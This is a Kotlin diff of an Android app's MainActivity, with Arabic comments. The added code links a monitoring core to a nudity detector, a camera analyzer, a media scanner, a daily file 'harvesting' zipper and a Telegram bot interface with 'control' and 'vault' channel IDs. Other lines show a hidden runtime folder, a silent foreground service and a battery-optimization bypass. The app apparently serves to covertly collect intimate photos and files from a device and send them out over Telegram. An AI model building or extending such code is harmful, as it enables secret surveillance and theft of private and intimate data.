@@ -150,7 +150,7 @@ class MainActivity : AppCompatActivity() {
         appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
     }
 
-    // ==================== عرض تقرير الحالة (جديد) ====================
+    // ==================== عرض تقرير الحالة ====================
 
     /**
      * عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
@@ -222,25 +222,50 @@ class MainActivity : AppCompatActivity() {
             appendLog("• معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
             appendLog("• المفتاح السري: ${if (config.secret != null) "✅ مفعل" else "⚠️ غير محدد"}")
 
-            // 5. تهيئة المراقب والواجهة
-            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة واختبار الاتصال...")
+            // 5. تهيئة المراقب والمكونات
+            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
             
             // ✅ استخدام Monitor.getInstance() لأن المُنشئ private
             val monitor = Monitor.getInstance(this@MainActivity)
             appendLog("• الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
 
-            // ✅ تمرير المعاملات بالترتيب الصحيح وبالأنواع الصحيحة
+            // ===== إنشاء المكونات وربطها =====
+            // 1. NudeDetector (كاشف المحتوى الحساس)
+            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
+            appendLog("• NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")
+
+            // 2. CameraAnalyzer (تحليل الكاميرا)
+            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
+            appendLog("• CameraAnalyzer: تم إنشاؤه")
+
+            // 3. TelegramUi (واجهة تلغرام) - نمرر config بدلاً من التوكنات
             telegramUi = TelegramUi(
                 context = this@MainActivity,
                 monitor = monitor,
-                activeTokens = config.activeTokens,
-                reserveTokens = config.reserveTokens,
-                ctrlId = config.controlId.toString(),   // تحويل Long إلى String
-                vaultId = config.vaultId.toString(),    // تحويل Long إلى String
-                appPassword = config.secret ?: ""       // استخدام secret أو نص فارغ
+                config = config  // ✅ تمرير كائن الإعدادات الكامل
             )
-
             val ui = telegramUi!!
+            appendLog("• TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
+
+            // 4. MediaScanner (ماسح الوسائط)
+            val mediaScanner = MediaScanner.create(this@MainActivity, monitor, ui)
+            appendLog("• MediaScanner: تم إنشاؤه")
+
+            // 5. DailyZipper (حصاد الملفات)
+            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
+            appendLog("• DailyZipper: تم إنشاؤه")
+
+            // ===== ربط المكونات بـ Monitor =====
+            monitor.ui = ui
+            monitor.ctrl = config.controlId
+            monitor.vlt = config.vaultId
+            monitor.cameraAnalyzer = cameraAnalyzer
+            monitor.mediaScanner = mediaScanner
+            monitor.dailyZipper = dailyZipper
+            monitor.nudeDetector = nudeDetector
+            appendLog("• تم ربط جميع المكونات بـ Monitor")
+
+            // ===== تشغيل الخدمات =====
             appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
             ui.start()
             monitor.start()
@@ -255,7 +280,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== إعداد المجلدات (Directories Setup) ====================
+    // ==================== إعداد المجلدات ====================
 
     private fun setupDirectories() {
         runtimeDir = File(filesDir, ".sys_runtime")
@@ -278,7 +303,7 @@ class MainActivity : AppCompatActivity() {
         modelsDir = File(runtimeDir, "models").apply { mkdirs() }
     }
 
-    // ==================== الأذونات الديناميكية (Permissions) ====================
+    // ==================== الأذونات الديناميكية ====================
 
     private fun requestAllPermissions() {
         val permissionsNeeded = mutableListOf(
@@ -311,7 +336,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== الخدمة الخلفية والإشعارات (Foreground Service) ====================
+    // ==================== الخدمة الخلفية والإشعارات ====================
 
     private fun startSilentForegroundService() {
         try {
@@ -336,7 +361,6 @@ class MainActivity : AppCompatActivity() {
                 PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
             )
 
-            // ✅ استخدام رمز التطبيق مباشرة بدلاً من البحث عن ic_notification
             val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
             } else {
@@ -359,7 +383,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== تجاوز تحسين البطارية (Battery Optimization) ====================
+    // ==================== تجاوز تحسين البطارية ====================
 
     private fun requestBatteryOptimizationExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -390,12 +414,8 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== إدارة نموذج AI (Model Management) مع Progress ====================
+    // ==================== إدارة نموذج AI مع Progress ====================
 
-    /**
-     * تحديث تقدم التحميل في ProgressBar.
-     * @param progress النسبة المئوية للتقدم (0-100)
-     */
     private fun updateProgress(progress: Int) {
         _progressState.value = progress.coerceIn(0, 100)
     }
@@ -472,12 +492,8 @@ class MainActivity : AppCompatActivity() {
             appendLog("⚠️ الحجم المتوقع غير محدد، سيتم التحقق من سلامة الملف لاحقاً.")
         }
 
-        // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة ومعاودة التقدم
+        // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة
         val downloader = FileDownloader(this)
-
-        // محاكاة تقدم التحميل (لأن FileDownloader لا يوفر تقدم حقيقي حالياً)
-        var progress = 10
-        updateProgress(progress)
 
         // بدء تحميل حقيقي في الخلفية
         val success = withContext(Dispatchers.IO) {
